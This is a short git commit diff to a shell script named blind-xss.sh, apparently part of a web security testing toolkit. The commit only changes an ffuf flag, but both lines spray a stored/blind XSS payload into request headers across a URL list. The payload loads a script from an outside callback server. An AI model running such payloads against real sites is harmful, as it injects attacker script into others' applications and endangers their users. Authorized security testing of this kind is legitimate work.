e359a31c6a0dfc01b9ff5ac2393a32d89783aee3
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-11 00:14:26 +0100

    Update blind-xss.sh

--- xss/blind-xss/blind-xss.sh
+++ xss/blind-xss/blind-xss.sh
@@ -8,4 +8,4 @@ list=$1
 blindxss=$2
 
 echo -e "${RED}CHECK YOUR XSS HUNTER/BLIND XSS SERVER FOR POTENTIALS CALLBACKS!${NC}"
-ffuf -v -w $list:W1,headers.txt:W2 -H "W2: \"><script src=https://$blindxss></script>" -u W1 2 > /dev/null
+ffuf -r -w $list:W1,headers.txt:W2 -H "W2: \"><script src=https://$blindxss></script>" -u W1 2 > /dev/null
